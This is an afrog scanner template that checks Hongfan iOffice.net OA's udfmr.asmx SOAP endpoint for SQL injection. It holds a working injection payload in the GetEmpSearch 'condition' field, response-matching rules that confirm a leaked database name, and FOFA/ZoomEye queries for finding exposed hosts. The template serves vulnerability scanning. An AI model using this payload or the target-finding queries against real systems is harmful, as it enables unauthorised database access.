pocs/afrog-pocs/vulnerability/ioffice-oa-udfmr-asmx-sql-inject.yaml

id: ioffice-oa-udfmr-asmx-sql-inject

info:
  name: 红帆OA udfmr.asmx SQL注入漏洞
  author: zan8in
  severity: high
  verified: true
  description: |-
    红帆iOffice.net udfmr.asmx处存在SQL注入漏洞，攻击者可以从其中获取数据库权限。
    fofa: app="红帆-ioffice"
    zoomeye: app:"红帆 ioffice"
  tags: ioffice,hongfan,sqlinject
  created: 2023/10/27

rules:
  r0:
    request:
      method: POST
      path: /iOffice/prg/set/wss/udfmr.asmx
      headers:
        SOAPAction: "http://tempuri.org/ioffice/udfmr/GetEmpSearch"
        Content-Type: text/xml; charset=utf-8
      body: |
        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetEmpSearch xmlns="http://tempuri.org/ioffice/udfmr">
              <condition>1=db_name(1)</condition>
            </GetEmpSearch>
          </soap:Body>
        </soap:Envelope>
    expression: response.status == 500 && response.body.bcontains(b"'master'") && response.headers["content-type"].contains("text/xml") && response.body.bcontains(b'System.Data.SqlClient.SqlException:')
expression: r0()
